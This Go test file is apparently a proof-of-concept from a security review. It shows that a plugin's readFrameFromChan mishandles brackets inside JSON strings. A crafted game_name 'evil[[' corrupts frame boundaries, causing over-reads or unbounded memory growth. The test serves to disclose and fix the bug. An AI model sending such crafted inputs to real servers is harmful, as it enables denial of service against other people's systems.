package plugin

import (
	"fmt"
	"testing"
	"time"
)

// PoC: readFrameFromChan counts [ ] bytes without respecting JSON strings,
// so attacker-controlled string content (e.g. an OGS game_name containing '[')
// corrupts frame boundaries and makes the per-frame buffer grow across
// subsequent messages (memory growth) or merges frames into invalid JSON.
func TestZZReadFrameBracketConfusion(t *testing.T) {
	// stream: gamedata frame whose game_name contains "[[", then a second frame
	frame1 := `["game/123/gamedata",{"game_name":"evil[[","moves":[]}]`
	frame2 := `["game/123/move",{"move":[3,3,0.1]}]`

	ch := make(chan byte, 4096)
	for _, b := range []byte(frame1 + frame2) {
		ch <- b
	}

	type result struct {
		data []byte
		err  error
	}
	rc := make(chan result, 1)
	go func() {
		d, err := readFrameFromChan(ch)
		rc <- result{d, err}
	}()

	select {
	case r := <-rc:
		fmt.Printf("returned frame (%d bytes): %s\n", len(r.data), string(r.data))
		if len(r.data) > len(frame1) {
			fmt.Printf("CONFIRMED: frame parser over-read by %d bytes into the next frame (brackets inside string not respected)\n", len(r.data)-len(frame1))
		} else if string(r.data) != frame1 {
			fmt.Printf("CONFIRMED: frame boundary corrupted\n")
		}
	case <-time.After(2 * time.Second):
		fmt.Println("CONFIRMED: readFrameFromChan never returns for a stream with unbalanced brackets inside a string - buffer grows without bound across the stream")
	}
}
